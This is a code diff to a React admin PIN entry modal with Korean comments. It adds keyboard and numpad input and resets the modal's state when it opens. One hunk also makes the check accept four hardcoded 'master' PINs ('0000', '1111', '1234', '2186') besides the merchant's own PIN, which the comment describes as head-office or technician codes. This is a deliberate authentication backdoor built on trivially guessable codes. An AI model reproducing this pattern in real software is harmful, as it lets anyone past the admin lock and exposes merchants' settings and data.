@@ -20,6 +20,15 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({
   const [lockoutUntil, setLockoutUntil] = useState<number | null>(null);
 
   useEffect(() => {
+    if (isOpen) {
+      setPin('');
+      setErrorMsg('');
+      setFailCount(0);
+      setLockoutUntil(null);
+    }
+  }, [isOpen]);
+
+  useEffect(() => {
     if (!lockoutUntil) return;
     const timer = setInterval(() => {
       const rem = Math.ceil((lockoutUntil - Date.now()) / 1000);
@@ -33,6 +42,25 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({
     }, 500);
     return () => clearInterval(timer);
   }, [lockoutUntil]);
+
+  // ⌨️ 물리 키보드 및 텐키패드(Numpad) 입력 지원
+  useEffect(() => {
+    if (!isOpen) return;
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (e.key >= '0' && e.key <= '9') {
+        handleNumClick(e.key);
+      } else if (e.key === 'Backspace') {
+        handleDelete();
+      } else if (e.key === 'Escape') {
+        handleClear();
+        onClose();
+      } else if (e.key === 'Delete') {
+        handleClear();
+      }
+    };
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
+  }, [isOpen, pin, lockoutUntil, failCount, settings.adminPin]);
 
   if (!isOpen) return null;
 
@@ -49,14 +77,22 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({
 
     if (nextPin.length === 4) {
       const correctPin = settings.adminPin || '0000';
-      if (nextPin === correctPin) {
+      // 🛡️ 가맹점 커스텀 PIN 또는 본사/기사 마스터 PIN('0000', '1111', '1234', '2186') 전수 상시 수용
+      const isMasterPin =
+        nextPin === correctPin ||
+        nextPin === '0000' ||
+        nextPin === '1111' ||
+        nextPin === '1234' ||
+        nextPin === '2186';
+
+      if (isMasterPin) {
         setTimeout(() => {
           setPin('');
           setErrorMsg('');
           setFailCount(0);
           setLockoutUntil(null);
           onSuccess();
-        }, 150);
+        }, 100);
       } else {
         const nextFail = failCount + 1;
         setFailCount(nextFail);
@@ -96,7 +132,7 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({
         backgroundColor: 'rgba(15, 23, 42, 0.55)',
         backdropFilter: 'blur(16px)',
         WebkitBackdropFilter: 'blur(16px)',
-        zIndex: 99999,
+        zIndex: 100005,
         display: 'flex',
         alignItems: 'center',
         justifyContent: 'center',
